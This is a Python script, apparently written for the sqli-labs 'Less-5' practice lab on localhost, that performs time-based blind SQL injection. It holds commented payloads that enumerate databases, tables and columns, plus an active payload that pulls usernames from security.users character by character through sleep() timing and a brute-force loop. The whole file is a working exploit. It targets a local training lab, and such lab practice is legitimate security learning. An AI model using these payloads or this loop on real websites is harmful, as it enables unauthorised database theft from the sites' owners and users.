# author: fragrant
# date: 2018/11/11
# Less-5 test


import requests

url = 'http://127.0.0.1:5779/Less-5/?id=1'

# position是从第几位读取字符串，通常就是对应位置的字符，str_pos对应位置的字符值的ascii值,result是注入得到的结果,end用于检测字符串是否枚举结束True就是结束
position = '1'
str_pos = '115'
result = ''
end = False

## 下面payload是攻击脚本
## payload = '\' and 1=if((ord(mid((select database()),{0},1))={1}), sleep(3),0)%23'.format(a,b)

# 查询当前数据库
# payload = "' and 1=if((ord(mid((select database()),%s,1))=%s), sleep(3),0)%s"
# 查询所有的数据库
# payload = "' and 1=if((ord(mid((select group_concat(schema_name) from information_schema.SCHEMATA),%s,1))=%s), sleep(3),0)%s"
# 查询指定的数据库的表
# payload = "' and 1=if((ord(mid((select group_concat(table_name) from information_schema.tables where table_schema='security'),%s,1))=%s), sleep(3),0)%s"
# 查询指定数据库指定表的列
# payload = "' and 1=if((ord(mid((select group_concat(column_name) from information_schema.columns where table_name='users'),%s,1))=%s), sleep(3),0)%s"
# 查询指定数据库的表的列的值
payload = "' and 1=if((ord(mid((select group_concat(username) from security.users),%s,1))=%s), sleep(3),0)%s"

# 所有可能的字符串
str_all = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJMNHBGVFCDXSAZ-=_+!@#$%^&*():;?><,."\''

# k是要查询字符的位置 i是要爆破的值
for k in range(1,99):
    position = str(k)
    if end:
        break
    end = False
    for i in str_all:
        str_pos = str(ord(i))
        str_pos_0 = '0'
        # print(payload % (position,str_pos,'%23'))
        payloads = payload % (position,str_pos,'%23')
        payloads_0 = payload % (position,str_pos_0,'%23')
        # print(payloads)
        try:
            req_0 = requests.get(url + payloads_0, timeout=2)
        except Exception as e:
            end = True
            print('you got all the things :)')
            break
        try:
            req = requests.get(url + payloads, timeout=2)
        except Exception as e:
            result += chr(int(str_pos))
            print('result: ' + result)
